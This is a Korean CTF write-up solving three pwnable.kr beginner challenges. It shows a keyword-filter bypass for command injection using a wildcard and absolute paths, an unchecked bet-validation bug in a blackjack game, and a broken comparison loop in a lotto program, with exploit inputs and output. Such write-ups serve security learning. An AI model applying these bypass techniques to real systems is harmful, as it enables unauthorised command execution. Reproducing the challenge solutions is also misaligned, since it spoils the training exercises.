# 응~ write up 이야...

### [pwnable.kr](http://pwnable.kr/) Toddler's Bottle

- cmd1
- blackjack
- lotto

> 작성일 : 2018-08-02
>
> f.killrra

#### cmd1은 어떤 문제일까?

> 리눅스에서 환경변수에 관한 문제이다.
>
> ssh 접속 후 cmd1.c 파일을 열어보자.

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
    int r=0;
    r += strstr(cmd, "flag")!=0;
    r += strstr(cmd, "sh")!=0;
    r += strstr(cmd, "tmp")!=0;
    return r;
}
int main(int argc, char* argv[], char** envp){
    putenv("PATH=/thankyouverymuch");
    if(filter(argv[1])) return 0;
    system( argv[1] );
    return 0;
}
```

정말 간단한 소스코드이다.

[코드 분석]

>putenv() 는 PATH 환경변수를 thankyouverymuch로 초기화하고 있고, filter() 에서 0이상이 반환되어 온다면 if문 안으로 들어와서 return 0; 즉 정상종료 된다.
>
>하지만 0으로 반환된다면 system() 에 우리가 입력한 argv[1]가 인자로 들어가서 해당 명령을 실행하고 종료한다.
>
>우리는 여기서 flag를 보는 것이 목적이기 때문에 그 경우를 생각하면 된다.
>
>우리가 인자 값을 주면 system()에 들어가기 전에 filter() 에서 우리가 줬던 인자 중 flag, sh, tmp라는 문자열이 있는지 검사하고 만약 있다면 r이라는 지역 변수에 +1씩하여 return 값이 0을 초과하게끔 만든다.
>
>이를 우회하기 위해서는 flag, sh, tmp라는 인자값을 주면 안되는데
>
>flag 파일을 봐야하므로 *(와일드카드) 를 이용하면 쉽게 우회가 가능하다.
>
>예를 들어 cat fl* 라는 인자값을 줬다면 fl로 시작하는 모든 파일을 cat 해줄 것이다.

```bash
cmd1@ubuntu:~$ ./cmd1 'cat fl*'
sh: 1: cat: not found
```

하지만 소스코드에도 나와있듯이 putenv() 를 통해서 PATH를 초기화 해주는데..

리눅스에서 cd, ls 등의 명령어는 어딘가의 경로에 디렉토리 안에서 프로그램이 존재하는데 그렇기 때문에 원래 /bin/cd, /bin/ls 와 같이 명령어를 절대 경로로 입력해줘야한다. (맞다. 어딘가의 경로는 /bin 디렉토리이다.)

하지만 편의성을 위해서 PATH라는 환경변수에 경로를 추가하면 추가된 경로의 명령어를 쓸 수 있게 된다.이 문제에서는 putenv() 를 통해서 PATH의 값을 초기화 하기 때문에 cat 이 실행되지 않으니 절대경로로 입력을 해본다면..? 우리가 원하는 결과를 가져올 수 있을 것이다.

------

#### blackjack 너는 누구냐..?

> 1pt 짜리 굉장히 쉬운 문제라고 한다..

> Hey! check out this C implementation of blackjack game!
>
> I found it online
>
> * <http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html>
>
> I like to give my flags to millionares.
>
> how much money you got?
>
> Running at : nc pwnable.kr 9009

위 링크에 들어가서 소스코드를 확인해보자 (뒤로가기 하게 된다.)

flag는 백만장자가 되면 준다고 한다.
사실 형은 이 부분을 보지 않고 취약한 부분을 찾기 위해 무작정 소스코드를 분석했는데 정말 쓸데없는 짓이였다고 한다.

> [여담]
> 문제의 소스코드 상에서는 flag가 어떻게 출력되는지 찾을 수 가 없었다..

자. 그럼 살충제 형을 따라 분석을 해보자.
소스코드를 가만~ 보고 있으면 패턴이 보인다.
$$
main() -> asktitle() { yes or no } -> input 1 -> play()
$$
기본적으로 위의 함수대로 흘러간다.
물론 자세히 보면 yes 일때 no 일때 다르게 행동하지만 결론적으로 yes를 해야만 게임을 즐길 수 있는 형태이다.
그래서 결국에는 위 함수대로 흘러간다.

그럼 실행해보자.

```bash




              222                111                            
            222 222            11111                              
           222   222          11 111                            
                222              111                               
               222               111                           

CCCCC     SS            DD         HHHHH    C    C                
C    C    SS           D  D       H     H   C   C              
C    C    SS          D    D     H          C  C               
CCCCC     SS          D DD D     H          C C              
C    C    SS         D DDDD D    H          CC C             
C     C   SS         D      D    H          C   C               
C     C   SS        D        D    H     H   C    C             
CCCCCC    SSSSSSS   D        D     HHHHH    C     C            

                        21                                   
     DDDDDDDD      HH         CCCCC    S    S                
        DD        H  H       C     C   S   S              
        DD       H    H     C          S  S               
        DD       H HH H     C          S S              
        DD      H HHHH H    C          SS S             
        DD      H      H    C          S   S               
     D  DD     H        H    C     S   S    C             
      DDD      H        H     CCCCC    S     S            

         222                     111                         
        222                      111                         
       222                       111                         
      222222222222222      111111111111111                       
      2222222222222222    11111111111111111                         


                 Are You Ready?
                ----------------
                      (Y/N)
                        y


Enter 1 to Begin the Greatest Game Ever Played.
Enter 2 to See a Complete Listing of Rules.
Enter 3 to Exit Game. (Not Recommended)
Choice: 1    <- my input valu
```

그렇게 main() 의 아스키아트를 거쳐 asktitle()의 input값을 y로 진행을 한 뒤 1을 입력하면 아래와 같이 play()가 호출이된다.

```
Cash: $500
-------
|H    |
|  7  |
|    H|
-------

Your Total is 7

The Dealer Has a Total of 11

Enter Bet: $
```

이렇게 기본 Cash $500과 Enter Bet: $ 하고 입력을 받습니다. `취약점은 여기서 터진다.`

```c
int betting() //Asks user amount to bet
{

 printf("\n\nEnter Bet: $");

 scanf("%d", &bet);
 

 if (bet > cash) //If player tries to bet more money than player has

 {

        printf("\nYou cannot bet more money than you have.");

        printf("\nEnter Bet: ");

        scanf("%d", &bet);

        return bet;

 }

 else return bet;
} // End Function
```

Betting 함수에서 우리가 배팅하는 값을 받는데 bet > cash 일때 bet을 다시 입력받으면서 그에 대한 값 체크가 없고, 바로 그 값을 return 하기 때문에 전역 변수 bet은 우리가 조작할 수 있다는 것이다.

그렇다면 이제 백만장자가 될 수 있으니 그대로 500보다 더 큰 값을 입력해서 if문 안으로 들어오고, 백만의 수를 입력해주면 될것이다.

```
Cash: $500
-------
|H    |
|  7  |
|    H|
-------

Your Total is 7

The Dealer Has a Total of 11

Enter Bet: $1000

You cannot bet more money than you have.
Enter Bet: 100000000


Would You Like to Hit or Stay?
Please Enter H to Hit or S to Stay.
h
-------
|C    |
|  Q  |
|    C|
-------

Your Total is 17

The Dealer Has a Total of 16

Would You Like to Hit or Stay?
Please Enter H to Hit or S to Stay.
s

You Have Chosen to Stay at 17. Wise Decision!

The Dealer Has a Total of 17
Unbelievable! You Win!

You have 1 Wins and 0 Losses. Awesome!

Would You Like To Play Again?
Please Enter Y for Yes or N for No
y

YaY_I************flag************_LOL


Cash: $100000500
-------
|H    |
|  J  |
|    H|
-------

Your Total is 10

The Dealer Has a Total of 10

Enter Bet: $
```

이렇게 간단하게 백만장자가 되면서 flag가 출력된다.

------

#### lotto?

> 벌써 마지막 문제 lotto다.
> ~~이 문제는 필자가 side channel attack으로 시간차 공격을 하려다 코딩을 못해 포기했다는 소문이있다.~~

사실 이 문제를 write up 하기가 좀 애매하다. 

```
Mommy! I made a lotto program for my homework.
do you want to play?


ssh lotto@pwnable.kr -p2222 (pw:guest)
```

문제를 보면 별로 내용이 없다. 바로 코드를 살펴보자.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned char submit[6];

void play(){
    
    int i;
    printf("Submit your 6 lotto bytes : ");
    fflush(stdout);

    int r;
    r = read(0, submit, 6);

    printf("Lotto Start!\n");
    //sleep(1);

    // generate lotto numbers
    int fd = open("/dev/urandom", O_RDONLY);
    if(fd==-1){
        printf("error. tell admin\n");
        exit(-1);
    }
    unsigned char lotto[6];
    if(read(fd, lotto, 6) != 6){
        printf("error2. tell admin\n");
        exit(-1);
    }
    for(i=0; i<6; i++){
        lotto[i] = (lotto[i] % 45) + 1;        // 1 ~ 45
    }
    close(fd);
    
    // calculate lotto score
    int match = 0, j = 0;
    for(i=0; i<6; i++){
        for(j=0; j<6; j++){
            if(lotto[i] == submit[j]){
                match++;
            }
        }
    }

    // win!
    if(match == 6){
        system("/bin/cat flag");
    }
    else{
        printf("bad luck...\n");
    }

}

void help(){
    printf("- nLotto Rule -\n");
    printf("nlotto is consisted with 6 random natural numbers less than 46\n");
    printf("your goal is to match lotto numbers as many as you can\n");
    printf("if you win lottery for *1st place*, you will get reward\n");
    printf("for more details, follow the link below\n");
    printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
    printf("mathematical chance to win this game is known to be 1/8145060.\n");
}

int main(int argc, char* argv[]){

    // menu
    unsigned int menu;

    while(1){

        printf("- Select Menu -\n");
        printf("1. Play Lotto\n");
        printf("2. Help\n");
        printf("3. Exit\n");

        scanf("%d", &menu);

        switch(menu){
            case 1:
                play();
                break;
            case 2:
                help();
                break;
            case 3:
                printf("bye\n");
                return 0;
            default:
                printf("invalid menu\n");
                break;
        }
    }
    return 0;
}
```

main() 도 별게 없고, play()를 분석해보면 처음보는것이 있었는데..
/dev/urandom 라는 파일에서 유사난수를 읽어오는 것이다. (참고로 유사난수는 난수를 흉내내기 위해 알고리즘으로 생성되는 값을 말한다.)

구글에 /dev/urandom 취약점이라고 검색을 하니 여러 검색결과가 나왔지만 side channel attack 중 하나인 timing attack 으로 풀이한 CTF write up만 나왔다고 한다. ~~(덕분에 한참 해맸다.)~~ 

그래서 찾은 부분이 아래 소스 코드다.

```c
// calculate lotto score
    int match = 0, j = 0;
    for(i=0; i<6; i++){
        for(j=0; j<6; j++){
            if(lotto[i] == submit[j]){
                match++;
            }
        }
    }

    // win!
    if(match == 6){
        system("/bin/cat flag");
    }
    else{
        printf("bad luck...\n");
    }
```

입력한 값과 /dev/urandom 에서 읽어온 값과 if문을 통해 같은지 확인을 한 후 match++을 해주는 것 처럼!!! 보이지만 자세히보면 우리가 입력한 값 1개만 비교를 하여 match++ 해주는 것을 볼 수 있다.

그렇다면 우리가 입력한 값 중 1byte만 유사난수와 같아도 flag를 볼 수 있을 것이다.

그리고 또 유의해서 볼 부분이 전역으로 선언된 unsigned char submit[6] 과 

```c
for(i=0; i<6; i++){
        lotto[i] = (lotto[i] % 45) + 1;        // 1 ~ 45
    }
```

이 부분인데 여기서 lotto의 값을 45로 나눈 나머지 값에 + 1을 하기 때문에 우리가 할 수 있는 최소한의 조건이 생긴다.

먼저 우리가 입력한 값이 들어가는 submit[6] 이 char 즉, 문자형이므로 아스키코드로 수(숫자)를 입력해야하며 만약 A를 넣는다면 10진수로 65가 들어갈 것이다.

하지만 lotto에 들어가는 값은 모두 1 ~ 45 사이의 값이므로 아스키코드표를 참고해서 이 사이의 값을 하나씩 입력해주면 맞는게 하나라도 있을것이다.

그 값들은 우리가 키보드로 입력할 수 있는 것들 중 선택을 하면 되는데..

필자는 #, $, ", ! 이런 문자들을 입력해 봤다.

```
lotto@ubuntu:~$ ./lotto
- Select Menu -
1. Play Lotto
2. Help
3. Exit
1
Submit your 6 lotto bytes : !!!!!!
Lotto Start!
~~~~~~~~~~~~~~~~~~~~~~flag~~~~~~~~~~~~~~~~~~~~
- Select Menu -
1. Play Lotto
2. Help
3. Exit
1
Submit your 6 lotto bytes :       
Lotto Start!
bad luck...
- Select Menu -
1. Play Lotto
2. Help
3. Exit
1
Submit your 6 lotto bytes : """"""
Lotto Start!
~~~~~~~~~~~~~~~~~~~~~~flag~~~~~~~~~~~~~~~~~~~~
- Select Menu -
1. Play Lotto
2. Help
3. Exit
1
Submit your 6 lotto bytes : $$$$$$
Lotto Start!
bad luck...
- Select Menu -
1. Play Lotto
2. Help
3. Exit
1
Submit your 6 lotto bytes : ######
Lotto Start!
bad luck...
- Select Menu -
1. Play Lotto
2. Help
3. Exit
1
Submit your 6 lotto bytes : ######
Lotto Start!
s~~~~~~~~~~~~~~~~~~~~~~flag~~~~~~~~~~~~~~~~~~~~
- Select Menu -
1. Play Lotto
2. Help
3. Exit
```

flag가 잘~ 나온다.

이상 풀이를 마치도록 한다. 